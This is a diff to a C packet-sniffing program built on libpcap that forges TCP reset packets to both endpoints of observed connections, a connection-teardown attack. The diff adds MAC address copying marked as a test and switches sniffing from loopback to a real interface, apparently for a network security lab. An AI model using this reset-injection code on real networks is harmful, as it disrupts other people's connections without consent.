@@ -29,6 +29,12 @@ void processPacket(u_char *args, const struct pcap_pkthdr *header, const u_char 
 			spoofedContent.destinationPort = tcpHeader->destinationPort;
 			spoofedContent.sequenceNumber = tcpHeader->sequenceNumber;
 			spoofedContent.ackNumber = tcpHeader->ackNumber;
+			
+			//test
+			struct ethernetheader *e = (struct ethernetheader *) (buffer);
+			memcpy(spoofedContent.temps, e->sourceInterface, ETH_ALEN);
+			memcpy(spoofedContent.tempd, e->destinationInterface, ETH_ALEN);
+
             sendResetPacket(spoofedContent);
 
 			// Sending reset packet to receiver
@@ -38,6 +44,11 @@ void processPacket(u_char *args, const struct pcap_pkthdr *header, const u_char 
 			spoofedContent.destinationPort = tcpHeader->sourcePort;
 			spoofedContent.sequenceNumber = tcpHeader->ackNumber;
 			spoofedContent.ackNumber = tcpHeader->sequenceNumber;
+
+			//test
+			memcpy(spoofedContent.temps, e->destinationInterface, ETH_ALEN);
+			memcpy(spoofedContent.tempd, e->sourceInterface, ETH_ALEN);
+
 			sendResetPacket(spoofedContent);
 		}
 	}
@@ -46,7 +57,7 @@ void processPacket(u_char *args, const struct pcap_pkthdr *header, const u_char 
 int main(int argc, char *argv[])
 {
     pcap_t *handle;						// Session handle 
-	char dev[]="lo";					// The device to sniff on 
+	char dev[]="ens33";					// The device to sniff on 
 	char errbuf[PCAP_ERRBUF_SIZE];		// Error string 
 	struct bpf_program fp;				// The compiled filter 
 	char filter_exp[] = "";				// The filter expression 
